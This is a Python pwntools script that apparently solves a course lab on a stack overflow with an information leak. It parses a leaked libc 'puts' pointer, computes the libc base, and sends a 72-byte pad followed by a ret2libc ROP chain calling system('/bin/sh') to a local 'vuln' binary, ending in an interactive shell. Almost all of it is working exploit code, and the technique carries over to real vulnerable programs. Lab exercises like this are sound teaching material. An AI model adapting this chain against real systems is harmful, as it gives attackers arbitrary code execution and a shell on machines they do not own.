#!/usr/bin/env python3
"""Solve the Ch10 leak+overflow lab. Requires: pwntools 4.12+, glibc 2.39."""
import re, sys
from pwn import context, ELF, ROP, process, log, p64, cyclic, cyclic_find

context.arch = 'amd64'
context.log_level = 'info'

BIN  = ELF('./vuln', checksec=False)
LIBC = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

def leak_libc(io) -> int:
    """Parse `welcome. debug=0x...` and return libc's runtime base."""
    line = io.recvline_startswith(b'welcome.')
    m = re.search(rb'debug=0x([0-9a-f]+)', line)
    assert m, f'no leak in {line!r}'
    leaked = int(m.group(1), 16)                       # ❶ raw runtime ptr
    # `banner()` publishes dlsym(RTLD_DEFAULT, "puts"), i.e. the runtime
    # address of libc's `puts` symbol.  Subtracting its file offset gives
    # the libc mapping's base.  Any single, known-symbol leak works; we
    # pick `puts` because it is always resolved by the time banner runs.
    sym = 'puts'
    base = leaked - LIBC.symbols[sym]                  # ❷ one subtraction
    assert base & 0xfff == 0, f'unaligned libc base: {base:#x}'
    log.success('libc base = %#x  (from %s = %#x)', base, sym, leaked)
    return base

def find_offset() -> int:
    """Return the distance from the start of `name[64]` to the saved RIP."""
    # Determined once with cyclic() + gdb; asserted here so the exploit
    # documents the offset it depends on. See ch10-aslr/notes/offset.md.
    return 72                                          # ❸ 64 buffer + 8 rbp

def build_chain(libc_base: int) -> bytes:
    LIBC.address = libc_base                           # ❹ pwntools helper
    binsh   = next(LIBC.search(b'/bin/sh\0'))
    system  = LIBC.symbols['system']
    rop = ROP(LIBC)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]   # ❺ from libc
    ret     = rop.find_gadget(['ret'])[0]              #    stack alignment
    log.info('pop_rdi=%#x  system=%#x  binsh=%#x', pop_rdi, system, binsh)
    return b''.join([
        p64(ret),                                      # ❻ 16-byte align
        p64(pop_rdi), p64(binsh),
        p64(system),
    ])

def main():
    host_bin = sys.argv[1] if len(sys.argv) > 1 else './vuln'
    io = process(host_bin)
    libc_base = leak_libc(io)
    io.recvuntil(b'name? ')
    payload = cyclic(find_offset()) + build_chain(libc_base) + b'\n'
    io.send(payload)
    io.interactive()                                   # ❼ shell if it worked

if __name__ == '__main__':
    main()
